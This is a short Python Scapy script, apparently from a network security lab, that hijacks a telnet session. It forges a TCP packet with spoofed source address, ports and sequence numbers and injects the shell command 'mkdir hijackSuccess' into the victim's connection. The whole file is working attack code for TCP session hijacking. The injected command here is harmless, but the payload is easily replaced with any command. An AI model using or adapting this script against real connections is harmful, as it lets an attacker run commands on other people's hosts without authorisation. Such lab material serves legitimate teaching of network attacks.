#!/usr/bin/env python3
from scapy.all import *
ip = IP(src="10.9.0.6", dst="10.9.0.5")
tcp = TCP(sport=33244, dport=23, flags="A", seq=2640866398, ack=3823860749)
data = "\n mkdir hijackSuccess \n "
pkt = ip/tcp/data
ls(pkt)
send(pkt,verbose=0)